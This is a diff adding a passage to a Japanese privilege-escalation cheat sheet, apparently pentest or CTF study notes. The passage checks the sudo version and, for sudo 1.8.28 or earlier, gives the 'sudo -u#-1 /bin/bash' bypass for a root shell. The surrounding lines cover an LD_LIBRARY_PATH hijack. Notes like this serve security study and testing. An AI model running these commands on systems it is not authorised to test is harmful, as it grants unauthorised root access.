@@ -84,6 +84,18 @@ void hijack() {
 sudo LD_LIBRARY_PATH=/tmp [COMMAND]
 ```
 
+### バージョンを確認
+```
+sudo -V
+```
+
+・sudo =< ver1.8.28  
+他のユーザーとしてコマンドを実行できる権限（ALL）が与えられている必要あり。
+```
+sudo -u#-1 /bin/bash
+sudo -u#4294967295 /bin/bash
+```
+
 #### Memo
 LD_PRELOAD : プログラム（コマンド）実行の際に最初にロードする共有オブジェクトを指定する環境変数。  
 LD_LIBRARY_PATH : 最初に共有オブジェクトを検索しに行くディレクトリを指定する環境変数。  
